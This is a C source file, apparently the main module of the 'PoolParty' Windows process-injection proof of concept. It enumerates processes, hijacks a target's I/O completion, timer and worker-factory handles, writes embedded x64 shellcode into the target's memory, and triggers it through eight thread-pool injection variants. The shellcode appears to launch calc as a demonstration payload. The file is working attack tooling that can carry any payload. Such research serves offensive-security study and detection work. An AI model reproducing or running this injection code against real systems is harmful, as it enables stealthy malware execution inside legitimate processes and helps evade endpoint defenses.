#include "structs.h"
#include "typedefs.h"
#include "common.h"
#include <stdio.h>

HANDLE hijackProcessHandle(HANDLE targetProcess, const wchar_t* handleTypeName, uint32_t desiredAccess) {

	fnNtQueryInformationProcess pQueryProcInfo = NULL;
	fnNtQueryObject pQueryObject = NULL;

	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessSnapshotInfo = NULL;
	PPUBLIC_OBJECT_TYPE_INFORMATION objectInfo = NULL;

	uint32_t totalHandles = NULL;		
	uint32_t handleInfoSize = NULL;
	NTSTATUS status = 0x00;			
	HANDLE duplicatedHandle = NULL;
	BOOL handleFound = FALSE;		
	uint32_t objectTypeReturnLen = NULL;

	pQueryProcInfo = (fnNtQueryInformationProcess)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationProcess"));

	pQueryObject = (fnNtQueryObject)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryObject"));


	if (pQueryProcInfo == NULL || pQueryObject == NULL) {
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}

	if (!GetProcessHandleCount(targetProcess, (PDWORD)&totalHandles)) {
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}

	handleInfoSize = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION) + ((totalHandles + 15) * sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO));

	pProcessSnapshotInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize));
	if (pProcessSnapshotInfo == NULL) {
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}

	status = pQueryProcInfo(targetProcess,(PROCESSINFOCLASS)51,pProcessSnapshotInfo,handleInfoSize,NULL);

	if (status != ERROR_SUCCESS) {
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}

	for (size_t i = 0; i < pProcessSnapshotInfo->NumberOfHandles; i++) {

		if (!DuplicateHandle(targetProcess,pProcessSnapshotInfo->Handles[i].HandleValue,GetCurrentProcess(),&duplicatedHandle,desiredAccess,FALSE,NULL)) {
			continue;
		}

		pQueryObject(duplicatedHandle,ObjectTypeInformation,NULL,NULL,(PULONG)&objectTypeReturnLen);

		objectInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objectTypeReturnLen));
		if (objectInfo == NULL) {
			break;
		}

		status = pQueryObject(duplicatedHandle,ObjectTypeInformation,objectInfo,objectTypeReturnLen,NULL);

		if (status != ERROR_SUCCESS) {
			break;
		}

		if (wcsncmp(handleTypeName, objectInfo->TypeName.Buffer, wcslen(handleTypeName)) == 0) {
			handleFound = TRUE;
			break;
		}

		HeapFree(GetProcessHeap(), 0, objectInfo);
	}

	if (!handleFound) {
		duplicatedHandle = INVALID_HANDLE_VALUE;
	}

FUNC_END:

	if (pProcessSnapshotInfo) {
		HeapFree(GetProcessHeap(), 0, pProcessSnapshotInfo);
	}

	if (objectInfo) {
		HeapFree(GetProcessHeap(), 0, objectInfo);
	}

	return duplicatedHandle;
}

HANDLE hijackProcessIoPort(HANDLE processHandle) {
	return hijackProcessHandle(processHandle, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
}

HANDLE hijackProcessTimerQueue(HANDLE processHandle) {
	return hijackProcessHandle(processHandle, L"IRTimer", TIMER_ALL_ACCESS);
}

HANDLE hijackProcessWorkerFactory(HANDLE processHandle) {
	return hijackProcessHandle(processHandle, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
}

HANDLE enumerateProcess(wchar_t* processName) {

	uint32_t PidArray[2048] = { 0 };		
	wchar_t moduleBaseName[250] = { 0 };
	uint32_t sModulebaseName = 0;			
	uint32_t bytesReturned = 0;
	uint32_t bytesNeeded = 0;			
	uint32_t totalNumberOfPids = 0;

	HANDLE hProcess = NULL;
	HMODULE hModule = NULL;
	BOOL foundProcess = FALSE;

	if (!K32EnumProcesses((PDWORD)PidArray, sizeof(PidArray), (LPDWORD)&bytesReturned)) {
		return INVALID_HANDLE_VALUE;
	}

	totalNumberOfPids = bytesReturned / sizeof(uint32_t);

	for (size_t i = 0; i < totalNumberOfPids; i++) {

		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PidArray[i]);
		if (hProcess == NULL) {
			continue;
		}

		uint32_t moduleEnumBytesNeeded = 0;
		if (!K32EnumProcessModules(hProcess, &hModule, sizeof(hModule), (LPDWORD)&moduleEnumBytesNeeded)) {
			continue;
		}

		if (!K32GetModuleBaseNameW(hProcess, hModule, moduleBaseName, sizeof(moduleBaseName) / sizeof(wchar_t))) {
			continue;
		}

		if (wcscmp(moduleBaseName, processName) == 0) {

			foundProcess = TRUE;
			break;
		}

		memset(moduleBaseName, 0x00, sizeof(moduleBaseName));
	}

	if (foundProcess) {
		return hProcess;
	}
	else {
		return INVALID_HANDLE_VALUE;
	}
}

BOOL writePayloadIntoProcess(HANDLE hProcess, PVOID pPayload, size_t payloadSize, PVOID* pRemoteAddress) {

	PVOID remote = VirtualAllocEx(hProcess,NULL,payloadSize,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

	if (remote == NULL) {
		return FALSE;
	}

	size_t bytesWritten = 0;
	if (!WriteProcessMemory(hProcess, remote, pPayload, payloadSize, &bytesWritten) || bytesWritten != payloadSize) {
		return FALSE;
	}

	uint32_t oldProtect;
	if (!VirtualProtectEx(hProcess, remote, payloadSize, PAGE_EXECUTE_READ, (PDWORD)&oldProtect)) {
		return FALSE;
	}

	*pRemoteAddress = remote;

	return TRUE;
}

unsigned char Shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int wmain(int argc, wchar_t** argv) {

	HANDLE processHandle = NULL;
	HANDLE handleToHijack = NULL;
	PVOID remotePayload = NULL;
	HANDLE hWorkerFactory = NULL;

	if (argc < 3) {
		printf("Usage: \n");
		printf("1: [Target Process Name]\n");
		printf("2: [Types] - Options: \n\t{\"work\", \"startroutine\"}: for /workerfactory\n");
		printf("\t{\"wait\", \"jobobject\", \"alpc\", \"direct\", \"tpio\"}: for /ioport\n");
		printf("\t{\"tptimer\"}: for /timer\n");
		printf("Example: .\\PoolParty.exe Notepad.exe wait\n");
		return -1;
	}

	processHandle = enumerateProcess(argv[1]);
	if (processHandle == INVALID_HANDLE_VALUE) {
		return -1;
	}
	if (wcscmp(argv[2], L"startroutine") != 0) {
		if (!writePayloadIntoProcess(processHandle, Shellcode, sizeof(Shellcode), &remotePayload)) {
			return -1;
		}
	}
	if (wcscmp(argv[2], L"alpc") == 0) {
		handleToHijack = hijackProcessIoPort(processHandle);
		if (!InjectViaAlpc(processHandle, remotePayload, handleToHijack)) {
			return -1;
		}
	}
	else if (wcscmp(argv[2], L"jobobject") == 0) {
		handleToHijack = hijackProcessIoPort(processHandle);
		if (!InjectViaJobCallback(processHandle, remotePayload, handleToHijack)) {
			return -1;
		}
	}
	else if (wcscmp(argv[2], L"wait") == 0) {
		handleToHijack = hijackProcessIoPort(processHandle);
		if (!InjectViaTpWait(processHandle, remotePayload, handleToHijack)) {
			return -1;
		}
	}
	else if (wcscmp(argv[2], L"tpio") == 0) {
		handleToHijack = hijackProcessIoPort(processHandle);
		if (!InjectViaTpIo(processHandle, remotePayload, handleToHijack)) {
			return -1;
		}
	}
	else if (wcscmp(argv[2], L"direct") == 0) {
		handleToHijack = hijackProcessIoPort(processHandle);
		if (!InjectViaTpDirect(processHandle, remotePayload, handleToHijack)) {
			return -1;
		}
	}
	else if (wcscmp(argv[2], L"tptimer") == 0) {
		handleToHijack = hijackProcessTimerQueue(processHandle);
		hWorkerFactory = hijackProcessWorkerFactory(processHandle);
		if (!InjectViaTpTimer(hWorkerFactory, handleToHijack, remotePayload, processHandle)) {
			return -1;
		}
	}
	else if (wcscmp(argv[2], L"work") == 0) {
		handleToHijack = hijackProcessWorkerFactory(processHandle);
		if (!InjectViaTpWork(processHandle, remotePayload, handleToHijack)) {
			return -1;
		}
	}
	else if (wcscmp(argv[2], L"startroutine") == 0) {
		handleToHijack = hijackProcessWorkerFactory(processHandle);
		if (!InjectViaWorkerFactoryStartRoutine(processHandle, handleToHijack, Shellcode, sizeof(Shellcode))) {
			return -1;
		}
	}
	else {
		return -1;
	}

	if (handleToHijack) {
		CloseHandle(handleToHijack);
	}

	if (processHandle) {
		CloseHandle(processHandle);
	}

	return 0;
}
